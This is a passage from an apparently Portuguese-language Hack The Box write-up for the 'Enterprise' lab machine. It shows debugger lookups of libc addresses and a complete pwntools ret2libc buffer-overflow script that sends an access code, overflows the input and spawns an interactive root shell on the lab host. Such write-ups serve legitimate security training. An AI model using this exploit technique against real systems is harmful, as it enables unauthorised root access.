![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_valor.png)

`p exit` - 0xf7e3faf0

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_valor1.png)

`find &system,+9999999, "sh"` - 0xf7f6ddd5

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_valor2.png)

exploit.py
```
from pwn import *
HOST, PORT = '10.10.10.61', 32812

# Montagem do payload a ser enviado - EIP 212

lixo = '\x90' * 212
ret2libc = p32(0xf7e4c060) # system()
ret2libc += p32(0xf7e3faf0) # exit()
ret2libc += p32(0xf7f6ddd5) # sh

exploit = lixo + ret2libc

# Agora vamos montar a interacao ate o momento do buffer

r = remote(HOST, PORT)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")

# Agora enviamos o payload

r.sendline(exploit)

# Agora tornarmos o shell interativo

r.interactive()
```

## Virando root

Executamos e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_r.png)

## Pegando as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_user.png)

Sinceramente não consegui compreender muito bem essa parte do buffer overflow... preciso praticar melhor e mais vezes